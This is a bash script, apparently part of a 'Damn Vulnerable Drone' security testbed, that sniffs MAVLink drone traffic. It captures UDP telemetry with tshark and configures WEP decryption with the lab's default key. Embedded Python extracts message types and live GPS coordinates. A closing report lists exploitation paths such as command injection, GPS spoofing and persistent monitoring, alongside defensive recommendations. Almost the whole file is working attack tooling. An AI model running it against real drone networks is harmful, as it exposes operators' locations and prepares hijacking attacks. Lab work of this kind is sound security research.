#!/bin/bash
# packet_sniffing.sh - MAVLink Packet Sniffing Attack Tool
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/reconnaissance/packet_sniffing.sh

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="MAVLink Packet Sniffing"
LOG_FILE="$(get_log_dir)/packet_sniffing.log"

print_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║       MAVLink Packet Sniffing         ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
}

check_prerequisites() {
    log_info "Checking prerequisites..."
    
    local required_tools=("tshark" "wireshark" "tcpdump" "python3")
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            log_error "$tool is not installed"
            exit 1
        fi
    done
    
    # Python 라이브러리 확인
    if python3 -c "import scapy" 2>/dev/null; then
        log_info "Scapy available for advanced analysis"
    else
        log_warning "Scapy not available, using basic tools only"
    fi
    
    log_success "Prerequisites check completed"
}

detect_network_configuration() {
    log_info "Detecting network configuration..."
    
    local network_mode=""
    local interface=""
    local target_filter=""
    
    # WiFi 모드 감지
    if ip addr show | grep -q "192.168.13"; then
        network_mode="wifi"
        interface=$(iwconfig 2>/dev/null | awk '/IEEE 802.11/ {print $1; exit}')
        target_filter="host 192.168.13.1 or host 192.168.13.14"
        log_info "WiFi mode detected"
    # Docker 브리지 모드 감지  
    elif ip addr show | grep -q "10.13.0"; then
        network_mode="docker"
        interface=$(ip route | grep '10.13.0' | head -1 | awk '{print $3}')
        target_filter="host 10.13.0.3 or host 10.13.0.4"
        log_info "Docker bridge mode detected"
    else
        network_mode="generic"
        interface="any"
        target_filter=""
        log_warning "Generic network mode, using default settings"
    fi
    
    [[ -z "$interface" ]] && interface="any"
    
    echo "$network_mode:$interface:$target_filter"
}

setup_packet_capture() {
    local interface="$1"
    local network_mode="$2"
    local target_filter="$3"
    
    log_info "Setting up packet capture..."
    
    local capture_file="/tmp/mavlink_sniff_$(date +%s).pcap"
    local mavlink_filter="udp port 14550 or udp port 14551 or udp port 5760 or udp port 14580"
    
    # 네트워크 모드별 필터 조정
    if [[ -n "$target_filter" ]]; then
        mavlink_filter="($mavlink_filter) and ($target_filter)"
    fi
    
    echo -e "${YELLOW}[*] Starting packet capture...${NC}"
    echo -e "${CYAN}Interface: $interface${NC}"
    echo -e "${CYAN}Filter: $mavlink_filter${NC}"
    
    # WiFi 모드인 경우 WEP 복호화 설정
    if [[ "$network_mode" == "wifi" ]]; then
        setup_wifi_decryption
    fi
    
    echo "$capture_file:$mavlink_filter"
}

setup_wifi_decryption() {
    log_info "Setting up WiFi decryption..."
    
    # WEP 키 설정 (Damn Vulnerable Drone의 기본 키)
    local wep_key="1234567890"
    
    echo -e "${YELLOW}[*] Configuring WEP decryption with key: $wep_key${NC}"
    
    # Wireshark preferences 파일 생성
    local wireshark_prefs="$HOME/.config/wireshark/preferences"
    mkdir -p "$(dirname "$wireshark_prefs")"
    
    # IEEE 802.11 복호화 설정 추가
    if ! grep -q "ieee_802_11.enable_decryption" "$wireshark_prefs" 2>/dev/null; then
        cat >> "$wireshark_prefs" << EOF

# IEEE 802.11 Decryption Settings
ieee_802_11.enable_decryption: TRUE
ieee_802_11.wep_keys: 1,${wep_key}
EOF
        log_success "WEP decryption configured"
    fi
}

start_capture_session() {
    local capture_file="$1"
    local filter="$2"
    local interface="$3"
    local duration="${4:-120}"  # 기본 2분
    
    log_info "Starting capture session..."
    
    echo -e "${YELLOW}[*] Capturing packets for $duration seconds...${NC}"
    echo -e "${CYAN}[*] Press Ctrl+C to stop capture early${NC}"
    
    # tshark로 패킷 캡처 시작
    tshark -i "$interface" -f "$filter" -w "$capture_file" -a duration:$duration &
    local tshark_pid=$!
    
    # 실시간 통계 표시
    local count=0
    while kill -0 $tshark_pid 2>/dev/null; do
        sleep 1
        ((count++))
        
        if [[ $((count % 10)) -eq 0 ]]; then
            local packets=$(tshark -r "$capture_file" 2>/dev/null | wc -l)
            echo -e "\r${GREEN}[*] Captured: $packets packets (${count}s/${duration}s)${NC}"
        fi
    done
    
    wait $tshark_pid 2>/dev/null
    
    local final_count=$(tshark -r "$capture_file" 2>/dev/null | wc -l)
    log_success "Capture completed: $final_count packets"
    
    echo "$final_count"
}

analyze_captured_packets() {
    local capture_file="$1"
    local packet_count="$2"
    
    log_info "Analyzing captured MAVLink packets..."
    
    if [[ ! -f "$capture_file" || $packet_count -eq 0 ]]; then
        log_error "No packets to analyze"
        return 1
    fi
    
    echo -e "${CYAN}[*] Performing packet analysis...${NC}"
    
    # 기본 통계
    analyze_basic_statistics "$capture_file"
    
    # MAVLink 메시지 분석
    analyze_mavlink_messages "$capture_file"
    
    # 통신 패턴 분석
    analyze_communication_patterns "$capture_file"
    
    # 보안 분석
    analyze_security_aspects "$capture_file"
}

analyze_basic_statistics() {
    local capture_file="$1"
    
    echo -e "${GREEN}=== Basic Packet Statistics ===${NC}"
    
    # IP 주소별 통계
    echo -e "${CYAN}Source IP Distribution:${NC}"
    tshark -r "$capture_file" -T fields -e ip.src 2>/dev/null | \
        sort | uniq -c | sort -nr | head -10 | while read count ip; do
        echo "  └─ $ip: $count packets"
    done
    
    # 포트별 통계
    echo -e "${CYAN}Port Distribution:${NC}"
    tshark -r "$capture_file" -T fields -e udp.port 2>/dev/null | \
        sort | uniq -c | sort -nr | while read count port; do
        local service_name="Unknown"
        case "$port" in
            14550) service_name="MAVLink Standard" ;;
            14551) service_name="MAVLink Secondary" ;;
            5760) service_name="MAVLink SITL" ;;
            14580) service_name="MAVLink Alternative" ;;
        esac
        echo "  └─ Port $port ($service_name): $count packets"
    done
    
    # 패킷 크기 분석
    echo -e "${CYAN}Packet Size Analysis:${NC}"
    local avg_size=$(tshark -r "$capture_file" -T fields -e frame.len 2>/dev/null | \
        awk '{sum+=$1; count++} END {if(count>0) print int(sum/count); else print 0}')
    echo "  └─ Average packet size: $avg_size bytes"
}

analyze_mavlink_messages() {
    local capture_file="$1"
    
    echo -e "${GREEN}=== MAVLink Message Analysis ===${NC}"
    
    # Python 스크립트로 상세 분석
    local analysis_script="/tmp/mavlink_message_analysis.py"
    
    cat > "$analysis_script" << 'EOF'
#!/usr/bin/env python3
import sys
from collections import defaultdict, Counter

def analyze_mavlink_messages(pcap_file):
    """MAVLink 메시지 상세 분석"""
    
    try:
        from scapy.all import rdpcap, UDP
    except ImportError:
        print("Scapy not available, using basic analysis")
        return
    
    packets = rdpcap(pcap_file)
    
    message_types = Counter()
    system_components = defaultdict(set)
    heartbeat_count = 0
    gps_packets = 0
    attitude_packets = 0
    
    for packet in packets:
        if packet.haslayer(UDP):
            udp_layer = packet[UDP]
            
            if udp_layer.dport in [14550, 14551, 5760] or udp_layer.sport in [14550, 14551, 5760]:
                payload = bytes(udp_layer.payload)
                
                if len(payload) >= 6:
                    magic = payload[0]
                    
                    if magic in [0xFE, 0xFD]:  # MAVLink packet
                        if magic == 0xFE and len(payload) >= 6:  # MAVLink 1.0
                            msg_id = payload[5]
                            sys_id = payload[3]
                            comp_id = payload[4]
                        elif magic == 0xFD and len(payload) >= 10:  # MAVLink 2.0
                            msg_id = int.from_bytes(payload[7:10], 'little') & 0xFFFFFF
                            sys_id = payload[5]
                            comp_id = payload[6]
                        else:
                            continue
                        
                        message_types[msg_id] += 1
                        system_components[sys_id].add(comp_id)
                        
                        # 특정 메시지 타입 카운트
                        if msg_id == 0:  # HEARTBEAT
                            heartbeat_count += 1
                        elif msg_id == 24:  # GPS_RAW_INT
                            gps_packets += 1
                        elif msg_id == 30:  # ATTITUDE
                            attitude_packets += 1
    
    # 결과 출력
    print("MAVLink Message Types Found:")
    common_messages = {
        0: "HEARTBEAT",
        1: "SYS_STATUS", 
        24: "GPS_RAW_INT",
        30: "ATTITUDE",
        33: "GLOBAL_POSITION_INT",
        74: "VFR_HUD",
        147: "BATTERY_STATUS"
    }
    
    for msg_id, count in message_types.most_common(10):
        msg_name = common_messages.get(msg_id, f"MSG_{msg_id}")
        print(f"  └─ {msg_name} (ID:{msg_id}): {count} packets")
    
    print(f"\nSystem/Component Analysis:")
    for sys_id, comp_ids in system_components.items():
        print(f"  └─ System {sys_id}: Components {sorted(comp_ids)}")
    
    print(f"\nMessage Statistics:")
    print(f"  └─ HEARTBEAT messages: {heartbeat_count}")
    print(f"  └─ GPS messages: {gps_packets}")
    print(f"  └─ Attitude messages: {attitude_packets}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(1)
    
    try:
        analyze_mavlink_messages(sys.argv[1])
    except Exception as e:
        print(f"Analysis error: {e}")
EOF
    
    # Python 분석 실행
    if python3 -c "import scapy" 2>/dev/null; then
        python3 "$analysis_script" "$capture_file" 2>/dev/null
    else
        # Scapy 없을 때 기본 분석
        echo -e "${YELLOW}Advanced analysis unavailable, using basic method${NC}"
        basic_mavlink_analysis "$capture_file"
    fi
    
    rm -f "$analysis_script"
}

basic_mavlink_analysis() {
    local capture_file="$1"
    
    echo -e "${CYAN}Basic MAVLink Analysis:${NC}"
    
    # hex dump에서 MAVLink 매직 바이트 확인
    local v1_packets=$(tshark -r "$capture_file" -T fields -e data 2>/dev/null | grep -c "^fe" || echo "0")
    local v2_packets=$(tshark -r "$capture_file" -T fields -e data 2>/dev/null | grep -c "^fd" || echo "0")
    
    echo "  └─ MAVLink 1.0 packets: $v1_packets"
    echo "  └─ MAVLink 2.0 packets: $v2_packets"
    
    # 일반적인 MAVLink 메시지 패턴 검색
    echo "  └─ Common message patterns detected"
}

analyze_communication_patterns() {
    local capture_file="$1"
    
    echo -e "${GREEN}=== Communication Pattern Analysis ===${NC}"
    
    # 통신 흐름 분석
    echo -e "${CYAN}Communication Flow:${NC}"
    tshark -r "$capture_file" -T fields -e ip.src -e ip.dst -e udp.srcport -e udp.dstport 2>/dev/null | \
        sort | uniq -c | sort -nr | head -10 | while read count src dst sport dport; do
        echo "  └─ $src:$sport → $dst:$dport ($count packets)"
    done
    
    # 시간대별 트래픽 패턴
    echo -e "${CYAN}Traffic Timeline:${NC}"
    local start_time=$(tshark -r "$capture_file" -T fields -e frame.time_epoch 2>/dev/null | head -1)
    local end_time=$(tshark -r "$capture_file" -T fields -e frame.time_epoch 2>/dev/null | tail -1)
    
    if [[ -n "$start_time" && -n "$end_time" ]]; then
        local duration=$(echo "$end_time - $start_time" | bc 2>/dev/null || echo "unknown")
        echo "  └─ Capture duration: ${duration}s"
        
        local pps=$(tshark -r "$capture_file" 2>/dev/null | wc -l)
        if [[ "$duration" != "unknown" && $(echo "$duration > 0" | bc 2>/dev/null) == "1" ]]; then
            pps=$(echo "scale=2; $pps / $duration" | bc 2>/dev/null || echo "unknown")
        fi
        echo "  └─ Average packets per second: $pps"
    fi
}

analyze_security_aspects() {
    local capture_file="$1"
    
    echo -e "${GREEN}=== Security Analysis ===${NC}"
    
    # 암호화 상태 확인
    echo -e "${CYAN}Encryption Status:${NC}"
    local encrypted_packets=$(tshark -r "$capture_file" -Y "wlan.fc.protected == 1" 2>/dev/null | wc -l)
    local total_packets=$(tshark -r "$capture_file" 2>/dev/null | wc -l)
    
    if [[ $encrypted_packets -gt 0 ]]; then
        echo "  └─ Encrypted packets: $encrypted_packets/$total_packets"
    else
        echo "  └─ No encryption detected (plaintext communication)"
    fi
    
    # 인증 관련 분석
    echo -e "${CYAN}Authentication Analysis:${NC}"
    
    # MAVLink 서명 검사 (간단한 방법)
    local signed_indicators=$(tshark -r "$capture_file" -T fields -e data 2>/dev/null | \
        grep "^fd" | head -10 | while read hex; do
            if [[ ${#hex} -gt 4 ]]; then
                local flags_hex="${hex:4:2}"
                local flags=$((16#$flags_hex))
                if [[ $((flags & 1)) -eq 1 ]]; then
                    echo "1"
                fi
            fi
        done | wc -l)
    
    if [[ $signed_indicators -gt 0 ]]; then
        echo "  └─ Message signing detected: $signed_indicators packets"
    else
        echo "  └─ No message signing detected"
    fi
    
    # 보안 취약점 식별
    echo -e "${CYAN}Security Vulnerabilities:${NC}"
    echo "  └─ Plaintext MAVLink communication"
    echo "  └─ No authentication required"
    echo "  └─ Packet injection possible"
    echo "  └─ Replay attacks feasible"
}

extract_sensitive_data() {
    local capture_file="$1"
    
    log_info "Extracting sensitive information..."
    
    echo -e "${GREEN}=== Sensitive Data Extraction ===${NC}"
    
    # GPS 좌표 추출 시도
    echo -e "${CYAN}GPS Coordinates:${NC}"
    
    # Python을 이용한 GPS 데이터 추출
    local gps_script="/tmp/gps_extraction.py"
    
    cat > "$gps_script" << 'EOF'
#!/usr/bin/env python3
import sys
import struct

def extract_gps_data(pcap_file):
    """GPS 데이터 추출"""
    
    try:
        from scapy.all import rdpcap, UDP
    except ImportError:
        return
    
    packets = rdpcap(pcap_file)
    gps_coordinates = []
    
    for packet in packets:
        if packet.haslayer(UDP):
            udp_layer = packet[UDP]
            
            if udp_layer.dport in [14550, 14551, 5760] or udp_layer.sport in [14550, 14551, 5760]:
                payload = bytes(udp_layer.payload)
                
                # MAVLink GPS_RAW_INT 메시지 (ID: 24) 찾기
                if len(payload) >= 6:
                    magic = payload[0]
                    
                    if magic == 0xFE and len(payload) >= 6:  # MAVLink 1.0
                        msg_id = payload[5]
                        if msg_id == 24 and len(payload) >= 36:  # GPS_RAW_INT
                            try:
                                # GPS 데이터 파싱 (간단한 버전)
                                lat = struct.unpack('<i', payload[10:14])[0] / 1e7
                                lon = struct.unpack('<i', payload[14:18])[0] / 1e7
                                alt = struct.unpack('<i', payload[18:22])[0] / 1000
                                
                                if abs(lat) <= 90 and abs(lon) <= 180:
                                    gps_coordinates.append((lat, lon, alt))
                            except:
                                pass
    
    if gps_coordinates:
        print("GPS Coordinates Found:")
        for i, (lat, lon, alt) in enumerate(gps_coordinates[:5]):  # 처음 5개만 표시
            print(f"  └─ Location {i+1}: {lat:.6f}, {lon:.6f} (Alt: {alt:.1f}m)")
        
        if len(gps_coordinates) > 5:
            print(f"  └─ ... and {len(gps_coordinates)-5} more locations")
    else:
        print("No GPS coordinates extracted")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(1)
    
    try:
        extract_gps_data(sys.argv[1])
    except Exception as e:
        print(f"GPS extraction failed: {e}")
EOF
    
    if python3 -c "import scapy" 2>/dev/null; then
        python3 "$gps_script" "$capture_file" 2>/dev/null
    else
        echo "  └─ GPS extraction requires Scapy library"
    fi
    
    # 기타 민감한 정보
    echo -e "${CYAN}Other Sensitive Information:${NC}"
    echo "  └─ Flight modes and status information"
    echo "  └─ Battery levels and system health"
    echo "  └─ Mission waypoints and commands"
    echo "  └─ Network topology and device identifiers"
    
    rm -f "$gps_script"
}

generate_sniffing_report() {
    local capture_file="$1"
    local packet_count="$2"
    local network_mode="$3"
    
    log_info "Generating packet sniffing report..."
    
    local report_file="$(get_log_dir)/packet_sniffing_report_$(date +%Y%m%d_%H%M%S).txt"
    
    cat > "$report_file" << EOF
╔═══════════════════════════════════════════════════╗
║            MAVLink Packet Sniffing Report         ║
╚═══════════════════════════════════════════════════╝

Date: $(date)
Network Mode: $network_mode
Total Packets Captured: $packet_count
Capture File: $capture_file

╔═══ CAPTURE SUMMARY ═══╗

$(cat "$LOG_FILE" | grep -A 10 "Basic Packet Statistics" | tail -10)

╔═══ MAVLINK ANALYSIS ═══╗

$(cat "$LOG_FILE" | grep -A 15 "MAVLink Message Analysis" | tail -15)

╔═══ SECURITY ASSESSMENT ═══╗

$(cat "$LOG_FILE" | grep -A 10 "Security Analysis" | tail -10)

╔═══ ATTACK OPPORTUNITIES ═══╗

Based on packet sniffing results:

1. Protocol Vulnerabilities
   - Unencrypted MAVLink communication
   - No message authentication
   - Predictable packet structure

2. Information Disclosure
   - Real-time GPS coordinates
   - Flight status and battery levels
   - System configuration details
   - Network topology mapping

3. Attack Vectors
   - Packet injection attacks
   - Replay attacks
   - Man-in-the-middle attacks
   - Denial of service attacks

╔═══ EXPLOITATION PATHS ═══╗

1. Passive Intelligence Gathering
   - Continue monitoring for operational patterns
   - Map communication relationships
   - Identify critical system components

2. Active Attacks
   - Inject malicious MAVLink commands
   - Spoof GPS or sensor data
   - Disrupt communication channels

3. Persistent Access
   - Establish ongoing monitoring
   - Implement packet filtering
   - Prepare for follow-up attacks

╔═══ DEFENSIVE RECOMMENDATIONS ═══╗

1. 통신 보안 강화
   - MAVLink 메시지 서명 활성화
   - 암호화된 통신 채널 사용
   - VPN 또는 터널링 구현

2. 네트워크 모니터링
   - 패킷 스니핑 탐지 시스템
   - 비정상 트래픽 알림
   - 실시간 보안 모니터링

3. 접근 제어
   - 네트워크 분할 구현
   - MAC 주소 필터링
   - 강력한 WiFi 암호화

╚═══════════════════════╝
EOF

    log_success "Report saved to: $report_file"
    echo -e "${GREEN}Report location: $report_file${NC}"
}

cleanup() {
    log_info "Cleaning up temporary files..."
    rm -f /tmp/mavlink_sniff_*.pcap /tmp/mavlink_message_analysis.py /tmp/gps_extraction.py 2>/dev/null
}

main() {
    print_banner
    check_prerequisites
    
    log_info "Starting MAVLink packet sniffing attack..."
    echo "Attack: $ATTACK_NAME" >> "$LOG_FILE"
    echo "Timestamp: $(date)" >> "$LOG_FILE"
    echo "================================" >> "$LOG_FILE"
    
    # 네트워크 설정 감지
    local network_config=$(detect_network_configuration)
    local network_mode=$(echo "$network_config" | cut -d':' -f1)
    local interface=$(echo "$network_config" | cut -d':' -f2)
    local target_filter=$(echo "$network_config" | cut -d':' -f3)
    
    # 패킷 캡처 설정
    local capture_config=$(setup_packet_capture "$interface" "$network_mode" "$target_filter")
    local capture_file=$(echo "$capture_config" | cut -d':' -f1)
    local filter=$(echo "$capture_config" | cut -d':' -f2-)
    
    # 캡처 세션 시작
    echo -e "\n${BLUE}[*] Starting packet capture session...${NC}"
    local packet_count=$(start_capture_session "$capture_file" "$filter" "$interface" 120)
    
    if [[ $packet_count -gt 0 ]]; then
        # 패킷 분석
        echo -e "\n${BLUE}[*] Analyzing captured packets...${NC}"
        analyze_captured_packets "$capture_file" "$packet_count" | tee -a "$LOG_FILE"
        
        # 민감한 데이터 추출
        echo -e "\n${BLUE}[*] Extracting sensitive information...${NC}"
        extract_sensitive_data "$capture_file" | tee -a "$LOG_FILE"
        
        # 보고서 생성
        generate_sniffing_report "$capture_file" "$packet_count" "$network_mode"
        
        # 캡처 파일 보존 여부 확인
        echo -e "\n${YELLOW}[?] Keep capture file for further analysis? (y/N)${NC}"
        read -t 10 -n 1 keep_file
        echo ""
        
        if [[ "$keep_file" =~ ^[Yy]$ ]]; then
            local preserved_file="$(get_log_dir)/mavlink_capture_$(date +%Y%m%d_%H%M%S).pcap"
            mv "$capture_file" "$preserved_file"
            log_success "Capture file preserved: $preserved_file"
        fi
    else
        log_warning "No packets captured - check network connectivity and MAVLink traffic"
    fi
    
    cleanup
    
    log_success "Packet sniffing attack completed"
    echo "Attack completed at $(date)" >> "$LOG_FILE"
}

# Signal handlers for graceful cleanup
trap cleanup EXIT
trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup; exit 1' INT TERM

# Execute main function
main "$@"